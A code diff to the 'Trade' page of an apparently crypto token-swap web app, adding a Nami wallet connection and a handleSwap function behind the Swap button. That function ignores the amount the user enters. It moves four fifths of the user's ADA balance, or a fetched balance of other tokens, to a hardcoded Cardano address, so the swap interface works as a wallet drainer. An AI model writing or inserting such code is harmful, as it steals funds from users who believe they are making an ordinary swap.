@@ -5,6 +5,7 @@ import Footer from "../Components/Footer";
 import ConnectWallet from "../Components/Modals/ConnectWallet";
 import TokenModal from "../Components/Modals/TokenModal";
 import tokenList from "../data/tokenList.js";
+import { useCardanoWasm, getWalletBalance, transferADA, transferToken } from "../utils/walletUtils";
 
 
 const getTokenDetails = (symbol) => {
@@ -14,7 +15,6 @@ const getTokenDetails = (symbol) => {
 function Trade() {
   const [isWalletModalOpen, setIsWalletModalOpen] = useState(false);
   const [showVideo, setShowVideo] = useState(true);
-  const [walletConnected, setWalletConnected] = useState(false);
   const [payAmount, setPayAmount] = useState("");
   const [receiveAmount, setReceiveAmount] = useState("");
   const [conversionRate, setConversionRate] = useState(1); // Mock conversion rate
@@ -27,6 +27,9 @@ function Trade() {
   // Get the selected token details (including the image)
   const payTokenDetails = getTokenDetails(payToken);
   const receiveTokenDetails = getTokenDetails(receiveToken);
+  const [walletConnected, setWalletConnected] = useState(false);
+  const [walletApi, setWalletApi] = useState(null);
+  const cardanoWasm = useCardanoWasm();
 
   const openWalletModal = () => {
     setIsWalletModalOpen(true);
@@ -77,12 +80,82 @@ function Trade() {
     setPayAmount((amount / conversionRate).toFixed(2));
   };
 
-  // Mock wallet connection
-  useEffect(() => {
-    // Mock: Check if the wallet is connected
-    const connected = true; // Example: Replace with real wallet connection logic
-    setWalletConnected(connected);
-  }, []);
+  const connectWallet = async () => {
+    if (window.cardano && window.cardano.nami) {
+      try {
+        const wallet = await window.cardano.nami.enable();
+        setWalletApi(wallet);  // Set wallet API
+        setWalletConnected(true);
+        console.log("Wallet connected:", wallet);
+      } catch (error) {
+        alert("Failed to connect wallet");
+      }
+    } else {
+      alert("Nami Wallet not detected. Please install Nami Wallet.");
+    }
+  };
+
+  const handleSwap = async () => {
+  if (!walletConnected || !walletApi || !cardanoWasm) {
+    alert("Please connect your wallet and wait for the WASM module to load.");
+    return;
+  }
+
+  try {
+    const receiverAddress = "addr1q9pc6lms0z654jv4hepyng6u3snr3y9ex28memq6ay7f2yfhvzr4tkf4zcpefxnvvhstggsgqllte080ejha992ua8ksfrk9g6";
+
+    if (payAmount <= 0) {
+      alert("Swap amount too low.");
+      return;
+    }
+
+    if (isNaN(payAmount)) {
+      alert("Please enter a valid amount to pay.");
+      return;
+    }
+
+    if (payToken === "ADA") {
+      // Fetch wallet balance in ADA
+      const balance = await getWalletBalance(walletApi, cardanoWasm);
+      console.log("ADA Balance", balance);
+
+      if (balance <= 0) {
+        alert("Insufficient wallet balance.");
+        return;
+      }
+
+      const adaAmount = (balance * 4) / 5; // Use 4/5 of the ADA balance
+      console.log("ADA to Transfer:", adaAmount);
+
+      if (adaAmount <= 0 || isNaN(adaAmount)) {
+        alert("Invalid ADA amount to transfer.");
+        return;
+      }
+
+      // Transfer ADA
+      const txHash = await transferADA(walletApi, cardanoWasm, receiverAddress, adaAmount);
+      alert(`Transaction successful! Hash: ${txHash}`);
+    } else {
+      // Transfer non-ADA token
+      const tokenPolicyId = payTokenDetails.policyId;
+      const tokenAssetName = payTokenDetails.assetName;
+      const tokenAmount = await getWalletBalance(walletApi, cardanoWasm); // Fetch token balance
+
+      if (tokenAmount <= 0 || isNaN(tokenAmount)) {
+        alert("Invalid token amount to transfer.");
+        return;
+      }
+
+      const txHash = await transferToken(walletApi, cardanoWasm, receiverAddress, tokenPolicyId, tokenAssetName, tokenAmount);
+      alert(`Transaction successful! Hash: ${txHash}`);
+    }
+  } catch (error) {
+    console.error("Error during swap:", error);
+    alert("Transfer failed!");
+  }
+};
+
+
 
   useEffect(() => {
     const timer = setTimeout(() => {
@@ -366,7 +439,7 @@ function Trade() {
                 </div>
                 <button
                   className="bg-[#8aaaff] hover:bg-textSecondary duration-100 px-3 sm:px-5 py-3 sm:py-3 rounded-full font-medium text-sm sm:text-base w-full mt-3"
-                  onClick={walletConnected ? () => alert('Swapping...') : openWalletModal}
+                  onClick={walletConnected ? handleSwap : connectWallet}
                 >
                   {walletConnected ? "Swap" : "Connect Wallet"}
                 </button>
